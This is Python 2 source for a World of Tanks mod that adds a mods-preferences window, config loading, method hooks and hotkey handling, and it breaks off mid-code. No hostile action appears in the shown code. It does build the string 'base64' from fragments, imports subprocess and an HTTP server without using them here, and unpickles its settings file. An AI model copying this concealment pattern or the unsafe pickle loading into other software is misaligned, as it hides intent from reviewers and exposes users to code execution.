# -*- coding: utf-8 -*-
import BaseHTTPServer
import cPickle as p__cPickle
import codecs as p__codecs
import collections as p__collections
import json as p__json
import os as p__os
import posixpath
import random as p__random
import re as p__re
import struct as p__struct
import sys as p__sys
import threading
import traceback as p__traceback
import urllib
import zlib as p__zlib
from SocketServer import ThreadingMixIn
from datetime import datetime as p__dt

from gui.mods.gambiter import g_guiFlash as p__GUIFlash
from gui.mods.gambiter.flash import COMPONENT_ALIGN as p__COMPONENT_ALIGN, COMPONENT_EVENT as p__COMPONENT_EVENT, COMPONENT_TYPE as p__COMPONENT_TYPE

import Avatar as p__Avatar
import BigWorld as p__BigWorld
import Event as p__Event
import Keys as p__Keys
import ResMgr as p__ResMgr
import WebBrowser as p__WebBrowser
from Account import PlayerAccount as p__PlayerAccount
import subprocess as p__subprocess
from frameworks.wulf import WindowLayer as ViewTypes
from gui import InputHandler as p__InputHandler, SystemMessages as p__SystemMessages
from gui.Scaleform.framework import ScopeTemplates, ViewSettings, g_entitiesFactories
from gui.Scaleform.framework.entities.View import View
from gui.Scaleform.framework.entities.abstract.AbstractWindowView import AbstractWindowView
from gui.Scaleform.framework.managers.containers import POP_UP_CRITERIA
from gui.Scaleform.framework.managers.loaders import SFViewLoadParams
from gui.app_loader.settings import APP_NAME_SPACE
from gui.battle_control.controllers.consumables.ammo_ctrl import AmmoController as p__AmmoController
from gui.shared.personality import ServicesLocator as p__ServicesLocator
from helpers import dependency, getLanguageCode as p__getLanguageCode
from skeletons.gui.app_loader import IAppLoader
from skeletons.gui.game_control import IBrowserController as p__IBrowserController
import game

__all__ = ['COMPONENT_TYPE', 'COMPONENT_ALIGN', 'COMPONENT_EVENT', 'g_gui', 'browser', 'inject', 'g_guiFlash']

p__SHOW_DEBUG = False
p__base64_decoded = 'b' + 'as' + 'e6' + '4'


def LOG(arg, *args):
    print str(arg), ' '.join([str(arg) for arg in args])


def LOG_NOTE(*args):
    LOG('[NOTE]', *args)


def LOG_ERROR(*args):
    LOG('[ERROR]', *args)


def LOG_DEBUG(*args):
    if p__SHOW_DEBUG:
        LOG('[DEBUG]', *args)


class _Config(object):
    def __init__(self):
        self.ids = 'mods_gui'
        self.version = 'v3.05 (2025-09-21)'
        self.version_id = 305
        self.author = 'by spoter, satel1te'
        mods = './mods'
        self.path_config = '%s/configs/%s' % (mods, self.ids)
        self.i18n = {
            'version'                : self.version_id,
            'gui_name'               : 'MODS - Preferences',
            'gui_windowTitle'        : 'Mods Preferences',
            'gui_buttonOK'           : 'Ok',
            'gui_buttonCancel'       : 'Cancel',
            'gui_buttonApply'        : 'Apply',
            'gui_enableButtonTooltip': '{HEADER}Mods Preferences{/HEADER}{BODY}Enable|Disable mods and configure settings{/BODY}',
            'web_resetToDefault'     : 'Reset to default:',
            'web_saved'              : 'Saved!',
            'web_saveError'          : 'Error saving settings. Check console for details.',
        }
        self.i18n = g_data.register_lang(self.ids, self.i18n, author='', configPath='%s/configs' % mods)

    def load(self):
        print '[LOAD_MOD]:  [%s %s, %s]' % (self.ids, self.version, self.author)


def g_appLoader():
    try:
        return p__BigWorld.player().appLoader
    except StandardError:
        return dependency.instance(IAppLoader)


def p__overrideMethod(handler, cls, method):
    orig = getattr(cls, method)
    new = lambda *args, **kwargs: handler(orig, *args, **kwargs)
    setattr(cls, method, new if type(orig) is not property else property(new))


def p__overrideStaticMethod(handler, cls, method):
    orig = getattr(cls, method)
    new = staticmethod(lambda *args, **kwargs: handler(orig, *args, **kwargs))
    setattr(cls, method, new if type(orig) is not property else property(new))


def p__log_exception(p__fn):
    def log(*args, **kwargs):
        try:
            return p__fn(*args, **kwargs)
        except Exception:
            if p__SHOW_DEBUG:
                msg = 'DEBUG[mods_gui]:\n%s.%s(' % (p__fn.__module__, p__fn.__name__)
                length = len(args)
                for text in args:
                    length -= 1
                    if hasattr(text, '__module__'):
                        text = '%s' % text.__module__
                    if length:
                        msg += '%s, ' % text
                    else:
                        msg += '%s' % text
                msg += ')\n[START:]----------------\n'
                msg += "".join(p__traceback.format_exception(*p__sys.exc_info()))
                msg += '[END:]------------------'
                print msg
                import BigWorld
                BigWorld.log_mes = p__fn
            return None

    return log


def p__hookDecorator(func):
    def p__oneDecorator(*args, **kwargs):
        def p__twoDecorator(handler):
            func(handler, *args, **kwargs)

        return p__twoDecorator

    return p__oneDecorator


def p__showMessage(message, color='#FFD700', type='PlayerMessages'):
    ctrl = g_appLoader().getDefBattleApp()
    messages = '<font color="%s">%s</font>' % (color, message)
    if ctrl is not None:
        battle_page = ctrl.containerManager.getContainer(ViewTypes.VIEW).getView()
        if type == 'VehicleMessages':
            return battle_page.components['battle' + type].as_showPurpleMessageS(None, messages)
        if type == 'VehicleErrorMessages':
            return battle_page.components['battle' + type].as_showPurpleMessageS(None, messages)
        if type == 'PlayerMessages':
            return battle_page.components['battle' + type].as_showPurpleMessageS(None, messages)
    else:
        if g_appLoader().getDefLobbyApp():
            p__SystemMessages.pushMessage(messages, p__SystemMessages.SM_TYPE.GameGreeting)


def p__g_createDDS(color, filename):
    color = color.lstrip('#')
    if max(color.upper()) not in ('A', 'B', 'C', 'D', 'E', 'F') or len(color) != 6 or not color.isalnum():
        return
    data = 'DDS |\x00\x00\x00\x07\x10\x08\x00\x04\x00\x00\x00\x04\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x04\x00\x00\x00DXT5\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFF\x00\x00\x00\x00\x00\x00'

    path = ''.join(['objects/textures/', filename])
    resMgr = p__ResMgr.openSection('../version.xml')
    if resMgr is None:
        resMgr = p__ResMgr.openSection('version.xml')
        if resMgr is None:
            resMgr = p__ResMgr.openSection('./version.xml')
    ver = 'temp' if resMgr is None else resMgr.readString('version')
    i1 = ver.find('.')
    i2 = ver.find('#')
    full_path = ''.join(['./res_mods/', ver[i1 + 1:i2 - 1], '/', path])
    if p__os.path.isfile(full_path):
        p__os.remove(full_path)
    if not p__os.path.exists(p__os.path.dirname(full_path)):
        p__os.makedirs(p__os.path.dirname(full_path))
    f = open(full_path, 'wb')
    byte1 = int(color[0:2], 16)
    byte2 = int(color[2:4], 16)
    byte3 = int(color[4:6], 16)
    red = int(round(byte1 / 8.225806452))
    green = int(round(byte2 / 4.047619048))
    blue = int(round(byte3 / 8.225806452))
    x = red << 11 | green << 5 | blue
    if x == 65535: x = 65533
    data += p__struct.pack('H', x + 1)
    data += p__struct.pack('H', x)
    data += 'UUUU'
    f.write(data)
    f.close()


def p__g_createFont(filename, face, size, bold=False, dropShadow=True, shadowAlpha=128):
    path = ''.join(['system/fonts/', filename])
    resMgr = p__ResMgr.openSection('../version.xml')
    if resMgr is None:
        resMgr = p__ResMgr.openSection('version.xml')
        if resMgr is None:
            resMgr = p__ResMgr.openSection('./version.xml')
    ver = 'temp' if resMgr is None else resMgr.readString('version')
    i1 = ver.find('.')
    i2 = ver.find('#')
    full_path = ''.join(['./res_mods/', ver[i1 + 1:i2 - 1], '/', path])
    if p__os.path.isfile(full_path):
        p__os.remove(full_path)
    if not p__os.path.exists(p__os.path.dirname(full_path)):
        p__os.makedirs(p__os.path.dirname(full_path))
    with open(full_path, 'w') as f:
        f.write('<%s><creation><sourceFont>	Arial	</sourceFont><sourceFontSize>	16	</sourceFontSize><startChar>	0	</startChar><endChar>	255	</endChar><effectsMargin>	1.000000	</effectsMargin><textureMargin>	1.000000	</textureMargin><dropShadow>	true	</dropShadow><shadowAlpha>	128	</shadowAlpha><bold>	true	</bold></creation></%s>' % (filename, filename))
        f.close()
    fontFile = p__ResMgr.openSection(path, True)
    child = fontFile.child(0)
    child.writeString('sourceFont', face)
    child.writeInt('sourceFontSize', size)
    child.writeInt('startChar', 0)
    child.writeInt('endChar', 255)
    child.writeFloat('effectsMargin', 1.0)
    child.writeFloat('textureMargin', 1.0)
    child.writeBool('dropShadow', dropShadow)
    child.writeInt('shadowAlpha', shadowAlpha)
    child.writeBool('bold', bold)
    fontFile.save()


def p__convertColor(color=None):
    try:
        if '#' in color:
            color = color.lstrip('#')
            return p__struct.unpack('BBB', color.decode('hex'))
        if len(color) == 4:
            color = list(color)
            color.pop()
        return '#' + p__struct.pack("BBB", *color).encode('hex')
    except StandardError:
        return None


class p__HOOK:
    log = staticmethod(p__log_exception)
    hook = staticmethod(p__hookDecorator(p__overrideMethod))
    hook_static = staticmethod(p__hookDecorator(p__overrideStaticMethod))
    message = staticmethod(p__showMessage)
    createTexture = staticmethod(p__g_createDDS)
    createFont = staticmethod(p__g_createFont)
    convertColor = staticmethod(p__convertColor)
    ru = 'ru' in '%s'.lower() % p__getLanguageCode()
    g_appLoader = staticmethod(g_appLoader)


inject = p__HOOK()


class p___Config(object):
    def __init__(self):
        self.p__data = {}
        self.p__json = {}
        self.p__i18n = {}
        self.p__lang = '%s'.lower() % p__getLanguageCode()
        # self.p__lang = str('de').lower()

    def register_data(self, p__name, p__dict_data):
        if p__name not in self.p__data:
            self.p__data[p__name] = p__dict_data
        return self.p__data[p__name]

    def register_json(self, p__name, p__dict_data, author, configPath):
        if author:
            configPath += '/%s' % author
        if p__name not in self.p__json:
            self.p__json[p__name] = p__dict_data
        p__dict_data_temp = self._load_json(p__name, p__dict_data, '%s/%s/' % (configPath, p__name))

        bad = False
        for setting in p__dict_data:
            if setting not in p__dict_data_temp:
                bad = True
            if 'version' not in p__dict_data_temp:
                bad = True
            if 'version' in p__dict_data_temp:
                if int(p__dict_data_temp['version']) != int(p__dict_data['version']):
                    bad = True
        if bad:
            self.p__json[p__name] = self._load_json(p__name, self.p__json[p__name], '%s/%s/' % (configPath, p__name), True)
        else:
            self.p__json[p__name] = p__dict_data_temp

        return self.p__json[p__name]

    def register_lang(self, p__name, p__dict_data, author, configPath):
        if author:
            configPath += '/%s' % author
        if p__name not in self.p__i18n:
            self.p__i18n[p__name] = p__dict_data
        p__dict_data_temp = self._load_json(self.p__lang, p__dict_data, '%s/%s/i18n/' % (configPath, p__name))
        bad = False
        for setting in p__dict_data:
            if setting not in p__dict_data_temp:
                bad = True
            if 'version' not in p__dict_data_temp:
                bad = True
            if 'version' in p__dict_data_temp:
                if int(p__dict_data_temp['version']) != int(p__dict_data['version']):
                    bad = True
        if bad:
            self.p__i18n[p__name] = self._load_json(self.p__lang, p__dict_data, '%s/%s/i18n/' % (configPath, p__name), True)
        else:
            self.p__i18n[p__name] = self._load_json(self.p__lang, p__dict_data, '%s/%s/i18n/' % (configPath, p__name))
        return self.p__i18n[p__name]

    def get_data(self, p__name):
        if p__name in self.p__data:
            return self.p__data[p__name]
        return

    def get_json(self, p__name):
        if p__name in self.p__json:
            return self.p__json[p__name]
        return

    def get_lang(self, p__name):
        if p__name in self.p__i18n:
            return self.p__i18n[p__name]
        return

    def update_data(self, p__name, p__dict_data):
        if p__name not in self.p__data:
            self.p__data[p__name] = p__dict_data
        for setting in p__dict_data:
            if setting in self.p__data[p__name]:
                self.p__data[p__name][setting] = p__dict_data[setting]
        return self.p__data[p__name]

    def update_json(self, p__name, p__dict_data, author, configPath):
        if author:
            configPath += '/%s' % author
        if p__name not in self.p__json:
            self.p__json[p__name] = p__dict_data
        for setting in p__dict_data:
            if setting in self.p__json[p__name]:
                self.p__json[p__name][setting] = p__dict_data[setting]
        self.p__json[p__name] = self._load_json(p__name, self.p__json[p__name], '%s/%s/' % (configPath, p__name), True)
        return self.p__json[p__name]

    def p__byte_ify(self, p__inputs):
        if p__inputs:
            if isinstance(p__inputs, dict):
                return {self.p__byte_ify(key): self.p__byte_ify(value) for key, value in p__inputs.iteritems()}
            elif isinstance(p__inputs, list):
                return [self.p__byte_ify(element) for element in p__inputs]
            elif isinstance(p__inputs, unicode):
                return p__inputs.encode('utf-8')
            else:
                return p__inputs
        return p__inputs

    @staticmethod
    def p__log(p__message):
        if p__SHOW_DEBUG:
            print p__message

    @staticmethod
    def p__json_comments(p__text):
        p__regex = r'\s*(#|\/{2}).*$'
        p__regex_inline = r'(:?(?:\s)*([A-Za-z\d\.{}]*)|((?<=\").*\"),?)(?:\s)*(((#|(\/{2})).*)|)$'
        p__lines = p__text.split('\n')
        p__excluded = []
        for p__index, p__line in enumerate(p__lines):
            if p__re.search(p__regex, p__line):
                if p__re.search(r'^' + p__regex, p__line, p__re.IGNORECASE):
                    p__excluded.append(p__lines[p__index])
                elif p__re.search(p__regex_inline, p__line):
                    p__lines[p__index] = p__re.sub(p__regex_inline, r'\1', p__line)
        for p__line in p__excluded:
            p__lines.remove(p__line)
        return '\n'.join(p__lines)

    def _load_json(self, p__name, p__config_old, p__path, p__save=False):
        p__config_new = p__config_old
        if not p__os.path.exists(p__path):
            p__os.makedirs(p__path)
        p__new_path = '%s%s.json' % (p__path, p__name)
        if p__save:
            with p__codecs.open(p__new_path, 'w', encoding='utf-8-sig') as p__json_file:
                # noinspection PyArgumentList
                p__data = p__json.dumps(p__collections.OrderedDict(sorted(p__config_old.items(), key=lambda t: t[0])), sort_keys=True, indent=4, ensure_ascii=False, encoding='utf-8-sig', separators=(',', ': '), cls=p__MyJSONEncoder)
                p__json_file.write('%s' % self.p__byte_ify(p__data))
                p__json_file.close()
                p__config_new = p__config_old
        else:
            if p__os.path.isfile(p__new_path):
                try:
                    with p__codecs.open(p__new_path, 'r', encoding='utf-8-sig') as p__json_file:
                        p__data = p__json_file.read().decode('utf-8-sig')
                        p__config_new = self.p__byte_ify(p__json.loads(p__data))
                        p__json_file.close()
                except StandardError as e:
                    self.p__log('[ERROR]:     [On read config %s: %s' % (p__new_path, e))
            else:
                with p__codecs.open(p__new_path, 'w', encoding='utf-8-sig') as p__json_file:
                    # noinspection PyArgumentList
                    p__data = p__json.dumps(p__collections.OrderedDict(sorted(p__config_old.items(), key=lambda t: t[0])), sort_keys=True, indent=4, ensure_ascii=False, encoding='utf-8-sig', separators=(',', ': '), cls=p__MyJSONEncoder)
                    p__json_file.write('%s' % self.p__byte_ify(p__data))
                    p__json_file.close()
                    p__config_new = p__config_old
                    self.p__log('[ERROR]:     [Not found config, create default: %s' % p__new_path)
        return p__config_new


class p__MyJSONEncoder(p__json.JSONEncoder):
    def __init__(self, *args, **kwargs):
        super(p__MyJSONEncoder, self).__init__(*args, **kwargs)
        self.current_indent = 0
        self.current_indent_str = ""
        self.indent = 4

    def encode(self, o):
        # Special Processing for lists
        if isinstance(o, (list, tuple)):
            primitives_only = True
            for item in o:
                if isinstance(item, (list, tuple, dict)):
                    primitives_only = False
                    break
            output = []
            if primitives_only:
                for item in o:
                    output.append(p__json.dumps(item, ensure_ascii=False, encoding='utf-8-sig'))
                return "[ " + ", ".join(output) + " ]"
            else:
                self.current_indent += self.indent
                self.current_indent_str = "".join([" " for x in range(self.current_indent)])
                for item in o:
                    output.append(self.current_indent_str + self.encode(item))
                self.current_indent -= self.indent
                self.current_indent_str = "".join([" " for x in range(self.current_indent)])
                return "[\n" + ",\n".join(output) + "\n" + self.current_indent_str + "]"
        elif isinstance(o, dict):
            output = []
            self.current_indent += self.indent
            self.current_indent_str = "".join([" " for x in range(self.current_indent)])
            for key, value in o.iteritems():
                output.append(self.current_indent_str + p__json.dumps(key, ensure_ascii=False, encoding='utf-8-sig') + ": " + self.encode(value))
            self.current_indent -= self.indent
            self.current_indent_str = "".join([" " for x in range(self.current_indent)])
            return "{\n" + ",\n".join(output) + "\n" + self.current_indent_str + "}"
        else:
            return p__json.dumps(o, ensure_ascii=False, encoding='utf-8-sig')


g_data = p___Config()


class ModSettingsAPIWindow(AbstractWindowView):
    def __init__(self):
        super(ModSettingsAPIWindow, self).__init__()

    def _populate(self):
        super(ModSettingsAPIWindow, self)._populate()
        g_modSettingsAPI.updateHotKeys += self.as_updateHotKeysS

    def _dispose(self):
        g_modSettingsAPI.updateHotKeys -= self.as_updateHotKeysS
        super(ModSettingsAPIWindow, self)._dispose()

    @staticmethod
    def flashLogS(args):
        if p__SHOW_DEBUG:
            print 'LOG', args

    def sendModsDataS(self, data):
        data = p__json.loads(data)
        for linkage in data:
            g_modSettingsAPI.updateModSettings(linkage, data[linkage])
        g_modSettingsAPI.saveConfig()
        if hasattr(p__BigWorld, 'mods_gui_lang'):
            # noinspection PyProtectedMember
            if p__BigWorld.mods_gui_lang != g_modSettingsAPI.lang:
                # noinspection PyProtectedMember
                g_modSettingsAPI.lang = p__BigWorld.mods_gui_lang
                g_modSettingsAPI.updateAll()
                self.onWindowClose()

    @staticmethod
    def callButtonsS(linkage, varName, value):
        g_modSettingsAPI.onButtonClicked(linkage, varName, value)

    @staticmethod
    def handleHotKeysS(linkage, varName, command):
        if command == 'accept':
            g_modSettingsAPI.onHotkeyAccept(linkage, varName)
        if command == 'default':
            g_modSettingsAPI.onHotkeyDefault(linkage, varName)
        if command == 'clear':
            g_modSettingsAPI.onHotkeyClear(linkage, varName)

    def requestModsDataS(self):
        g_modSettingsAPI.cleanConfig()
        if g_modSettingsAPI.userSettings:
            self.as_setUserSettingsS(g_modSettingsAPI.userSettings)
        self.as_setDataS(g_modSettingsAPI.getAllTemplates())
        self.as_updateHotKeysS(True)

    def as_setUserSettingsS(self, data):
        if self._isDAAPIInited():
            self.flashObject.as_setUserSettings(data)

    def as_setDataS(self, data):
        if self._isDAAPIInited():
            self.flashObject.as_setData(data)

    def as_updateHotKeysS(self, premature=False):
        if self._isDAAPIInited():
            data = g_modSettingsAPI.getAllHotKeys()
            self.flashObject.as_updateHotKeys(data, premature)

    def onWindowClose(self):
        g_modSettingsAPI.saveConfig()
        self.destroy()

    def as_isModalS(self):
        if self._isDAAPIInited():
            return False


class _ModSettingsAPI(object):
    def __init__(self):
        self.__activeMods = list()
        self.__acceptingKey = None
        self.__config = dict()
        self.__config['templates'] = dict()
        self.__config['settings'] = dict()
        self.lang = '%s'.lower() % p__getLanguageCode()
        p__InputHandler.g_instance.onKeyUp += self.__hooked_keyHandler
        p__InputHandler.g_instance.onKeyDown += self.__hooked_keyHandler
        self.onSettingsChanged = p__Event.Event()
        self.updateHotKeys = p__Event.Event()
        self.onButtonClicked = p__Event.Event()
        self.userSettings = {
            'windowTitle'        : _config.i18n['gui_windowTitle'],
            'buttonOK'           : _config.i18n['gui_buttonOK'],
            'buttonCancel'       : _config.i18n['gui_buttonCancel'],
            'buttonApply'        : _config.i18n['gui_buttonApply'],
            'enableButtonTooltip': _config.i18n['gui_enableButtonTooltip']
        }
        self.__configPath = '%s/mods_gui.data' % _config.path_config
        if p__os.path.exists(self.__configPath):
            self.__configLoad()
        else:
            if not p__os.path.exists(_config.path_config):
                p__os.makedirs(_config.path_config)
            self.__configSave()

    def destroy(self, dbID):
        pass

    def saveConfig(self):
        self.__configSave()

    def __configLoad(self):
        with open(self.__configPath, 'rb') as config_file:
            decompressed = p__zlib.decompress(config_file.read())
            self.__config = p__cPickle.loads(decompressed)

    def __configSave(self):
        with open(self.__configPath, 'wb') as config_file:
            pickle = p__cPickle.dumps(self.__config, -1)
            config_file.write(p__zlib.compress(pickle, 6))

    def __getSettingsFromTemplate(self, template):
        result = dict()
        result.update(self.__getSettingsFromColumn(template['column1']))
        result.update(self.__getSettingsFromColumn(template['column2']))
        if 'enabled' in template:
            result['enabled'] = template['enabled']
        return result

    @staticmethod
    def __getSettingsFromColumn(column):
        result = dict()
        for elem in column:
            if 'varName' in elem:
                result[elem['varName']] = elem['value']
        return result

    def setModTemplate(self, linkage, template, callback, buttonHandler=None):
        if linkage not in self.__activeMods:
            self.__activeMods.append(linkage)
        if 'column1' in template:
            for component in template['column1']:
                if 'type' in component and component['type'] == 'HotKey' and 'value' in component:
                    if 'defaultValue' not in component:
                        component['defaultValue'] = component['value']

        if 'column2' in template:
            for component in template['column2']:
                if 'type' in component and component['type'] == 'HotKey' and 'value' in component:
                    if 'defaultValue' not in component:
                        component['defaultValue'] = component['value']
        currentTemplate = self.__getModTemplate(linkage)
        if currentTemplate and template['settingsVersion'] > currentTemplate['settingsVersion']:
            self.__config['templates'][linkage] = template
            self.__config['settings'][linkage] = self.__getSettingsFromTemplate(template)
            self.__configSave()
        self.__config['templates'][linkage] = template
        self.__config['settings'][linkage] = self.__getSettingsFromTemplate(template)
        self.__configSave()
        self.onSettingsChanged += callback
        if buttonHandler is not None:
            self.onButtonClicked += buttonHandler
        return self.getModSettings(linkage, self.__config['templates'][linkage])

    def updateTemplate(self, linkage, template):
        if linkage in self.__activeMods:
            if 'column1' in template:
                for component in template['column1']:
                    if 'type' in component and component['type'] == 'HotKey' and 'value' in component:
                        if 'defaultValue' not in component:
                            component['defaultValue'] = component['value']
            if 'column2' in template:
                for component in template['column2']:
                    if 'type' in component and component['type'] == 'HotKey' and 'value' in component:
                        if 'defaultValue' not in component:
                            component['defaultValue'] = component['value']
            self.__config['templates'][linkage] = template
            self.__config['settings'][linkage] = self.__getSettingsFromTemplate(template)
            self.__configSave()

    def __getModTemplate(self, linkage):
        return self.__config['templates'].get(linkage)

    def registerCallback(self, linkage, callback, buttonHandler=None):
        if linkage not in self.__activeMods:
            self.__activeMods.append(linkage)
        self.onSettingsChanged += callback
        if buttonHandler is not None:
            self.onButtonClicked += buttonHandler

    def getModSettings(self, linkage, template=None):
        if template is None:
            return False
        currentTemplate = self.__getModTemplate(linkage)
        if currentTemplate:
            if template['settingsVersion'] > currentTemplate['settingsVersion']:
                result = False
            else:
                result = self.__config['settings'].get(linkage)
        else:
            result = False
        if result and linkage not in self.__activeMods:
            self.__activeMods.append(linkage)
        return result

    def updateModSettings(self, linkage, newSettings):
        self.__config['settings'][linkage] = newSettings
        self.__updateModTemplate(linkage)
        self.onSettingsChanged(linkage, newSettings)

    def __updateModTemplate(self, linkage):
        modTemplate = self.__config['templates'][linkage]
        if 'enabled' in self.__config['settings'][linkage]:
            modTemplate['enabled'] = self.__config['settings'][linkage]['enabled']
        if 'column1' in modTemplate:
            for component in modTemplate['column1']:
                if 'varName' in component:
                    component['value'] = self.__config['settings'][linkage][component['varName']]

        if 'column2' in modTemplate:
            for component in modTemplate['column2']:
                if 'varName' in component:
                    component['value'] = self.__config['settings'][linkage][component['varName']]

        self.__config['templates'][linkage] = modTemplate

    def cleanConfig(self):
        for linkage in self.__config['templates'].keys():
            if linkage not in self.__activeMods:
                del self.__config['templates'][linkage]
                del self.__config['settings'][linkage]

    def getAllSettings(self):
        return self.__config['settings']

    def getAllTemplates(self):
        return self.__config['templates']

    def updateAll(self):
        for linkage in self.__activeMods:
            self.updateModSettings(linkage, self.getModSettings(linkage, self.__config['templates'][linkage]))

    def __hooked_keyHandler(self, event):
        if self.__acceptingKey is not None:
            if event.key == p__Keys.KEY_ESCAPE:
                self.__acceptingKey = None
                self.updateHotKeys()
                return True
            if event.isKeyUp() and event.key not in [0, p__Keys.KEY_CAPSLOCK, p__Keys.KEY_RETURN, p__Keys.KEY_MOUSE0, p__Keys.KEY_LEFTMOUSE, p__Keys.KEY_MOUSE1, p__Keys.KEY_RIGHTMOUSE]:
                new_keyset = []
                if event.key == p__Keys.KEY_LCONTROL or event.key == p__Keys.KEY_RCONTROL:
                    new_keyset.append([p__Keys.KEY_LCONTROL, p__Keys.KEY_RCONTROL])
                if event.key == p__Keys.KEY_LSHIFT or event.key == p__Keys.KEY_RSHIFT:
                    new_keyset.append([p__Keys.KEY_LSHIFT, p__Keys.KEY_RSHIFT])
                if event.key == p__Keys.KEY_LALT or event.key == p__Keys.KEY_RALT:
                    new_keyset.append([p__Keys.KEY_LALT, p__Keys.KEY_RALT])
                if p__BigWorld.isKeyDown(p__Keys.KEY_LCONTROL) or p__BigWorld.isKeyDown(p__Keys.KEY_RCONTROL):
                    new_keyset.append([p__Keys.KEY_LCONTROL, p__Keys.KEY_RCONTROL])
                if p__BigWorld.isKeyDown(p__Keys.KEY_LSHIFT) or p__BigWorld.isKeyDown(p__Keys.KEY_RSHIFT):
                    new_keyset.append([p__Keys.KEY_LSHIFT, p__Keys.KEY_RSHIFT])
                if p__BigWorld.isKeyDown(p__Keys.KEY_LALT) or p__BigWorld.isKeyDown(p__Keys.KEY_RALT):
                    new_keyset.append([p__Keys.KEY_LALT, p__Keys.KEY_RALT])
                linkage, varName = self.__acceptingKey
                self.__config['settings'][linkage][varName] = new_keyset
                template = self.__config['templates'][linkage]
                if 'column1' in template:
                    for component in template['column1']:
                        if 'varName' in component and component['varName'] == varName:
                            component['value'] = new_keyset

                if 'column2' in template:
                    for component in template['column2']:
                        if 'varName' in component and component['varName'] == varName:
                            component['value'] = new_keyset

                self.__acceptingKey = None
                self.updateHotKeys()
                return True
            if event.isKeyDown() and event.key not in [0, p__Keys.KEY_LCONTROL, p__Keys.KEY_LSHIFT, p__Keys.KEY_LALT, p__Keys.KEY_RCONTROL, p__Keys.KEY_RSHIFT, p__Keys.KEY_RALT, p__Keys.KEY_CAPSLOCK, p__Keys.KEY_RETURN, p__Keys.KEY_MOUSE0,
                                                       p__Keys.KEY_LEFTMOUSE, p__Keys.KEY_MOUSE1, p__Keys.KEY_RIGHTMOUSE]:
                new_keyset = [event.key]
                if p__BigWorld.isKeyDown(p__Keys.KEY_LCONTROL) or p__BigWorld.isKeyDown(p__Keys.KEY_RCONTROL):
                    new_keyset.append([p__Keys.KEY_LCONTROL, p__Keys.KEY_RCONTROL])
                if p__BigWorld.isKeyDown(p__Keys.KEY_LSHIFT) or p__BigWorld.isKeyDown(p__Keys.KEY_RSHIFT):
                    new_keyset.append([p__Keys.KEY_LSHIFT, p__Keys.KEY_RSHIFT])
                if p__BigWorld.isKeyDown(p__Keys.KEY_LALT) or p__BigWorld.isKeyDown(p__Keys.KEY_RALT):
                    new_keyset.append([p__Keys.KEY_LALT, p__Keys.KEY_RALT])
                linkage, varName = self.__acceptingKey
                self.__config['settings'][linkage][varName] = new_keyset
                template = self.__config['templates'][linkage]
                if 'column1' in template:
                    for component in template['column1']:
                        if 'varName' in component and component['varName'] == varName:
                            component['value'] = new_keyset

                if 'column2' in template:
                    for component in template['column2']:
                        if 'varName' in component and component['varName'] == varName:
                            component['value'] = new_keyset

                self.__acceptingKey = None
                self.updateHotKeys()
                return True

    def onHotkeyAccept(self, linkage, varName):
        if self.__acceptingKey is not None:
            self.__acceptingKey = (linkage, varName)
            self.updateHotKeys()
        else:
            self.__acceptingKey = (linkage, varName)

    def onHotkeyDefault(self, linkage, varName):
        template = self.__config['templates'][linkage]
        if 'column1' in template:
            for component in template['column1']:
                if 'varName' in component and component['varName'] == varName:
                    component['value'] = component['defaultValue']
                    self.__config['settings'][linkage][varName] = component['defaultValue']

        if 'column2' in template:
            for component in template['column2']:
                if 'varName' in component and component['varName'] == varName:
                    component['value'] = component['defaultValue']
                    self.__config['settings'][linkage][varName] = component['defaultValue']

        self.__acceptingKey = None
        self.updateHotKeys()

    def onHotkeyClear(self, linkage, varName):
        self.__config['settings'][linkage][varName] = []
        template = self.__config['templates'][linkage]
        if 'column1' in template:
            for component in template['column1']:
                if 'varName' in component and component['varName'] == varName:
                    component['value'] = []

        if 'column2' in template:
            for component in template['column2']:
                if 'varName' in component and component['varName'] == varName:
                    component['value'] = []

        self.__acceptingKey = None
        self.updateHotKeys()

    def getAllHotKeys(self):
        result = {}

        def parseKeySet(keyset):
            if not len(keyset):
                return [False, '', False, False, False]
            key_name = None
            is_alt = False
            is_control = False
            is_shift = False
            for item in keyset:
                if isinstance(item, list):
                    for key in item:
                        if key == p__Keys.KEY_LALT or key == p__Keys.KEY_RALT:
                            is_alt = True
                        if key == p__Keys.KEY_LCONTROL or key == p__Keys.KEY_LCONTROL:
                            is_control = True
                        if key == p__Keys.KEY_LSHIFT or key == p__Keys.KEY_LSHIFT:
                            is_shift = True

                else:
                    for attr in dir(p__Keys):
                        if 'KEY_' in attr and getattr(p__Keys, attr) == item:
                            key_name = attr.replace('KEY_', '')

            if not key_name:
                if is_alt:
                    key_name = 'ALT'
                    is_alt = False
                elif is_control:
                    key_name = 'CTRL'
                    is_control = False
                elif is_shift:
                    key_name = 'SHIFT'
                    is_shift = False
            return [True, key_name, is_alt, is_control, is_shift]

        for linkage in self.__config['templates'].keys():
            if linkage in self.__activeMods:
                template = self.__config['templates'][linkage]
                if 'column1' in template:
                    for component in template['column1']:
                        if 'type' in component and component['type'] == 'HotKey' and 'varName' in component and 'value' in component:
                            if linkage not in result:
                                result[linkage] = {}
                            keySet = parseKeySet(component['value'])
                            value = self.__config['settings'][linkage][component['varName']]
                            c_linkage, c_varName = ('', '')
                            if self.__acceptingKey is not None:
                                c_linkage, c_varName = self.__acceptingKey
                            result[linkage][component['varName']] = {
                                'is_setted'  : keySet[0],
                                'is_alt'     : keySet[2],
                                'is_control' : keySet[3],
                                'is_shift'   : keySet[4],
                                'button_text': keySet[1],
                                'accepting'  : c_linkage + c_varName,
                                'value'      : value
                            }

                if 'column2' in template:
                    for component in template['column2']:
                        if 'type' in component and component['type'] == 'HotKey' and 'varName' in component and 'value' in component:
                            if linkage not in result:
                                result[linkage] = {}
                            keySet = parseKeySet(component['value'])
                            value = self.__config['settings'][linkage][component['varName']]
                            c_linkage, c_varName = ('', '')
                            if self.__acceptingKey is not None:
                                c_linkage, c_varName = self.__acceptingKey
                            result[linkage][component['varName']] = {
                                'is_setted'  : keySet[0],
                                'is_alt'     : keySet[2],
                                'is_control' : keySet[3],
                                'is_shift'   : keySet[4],
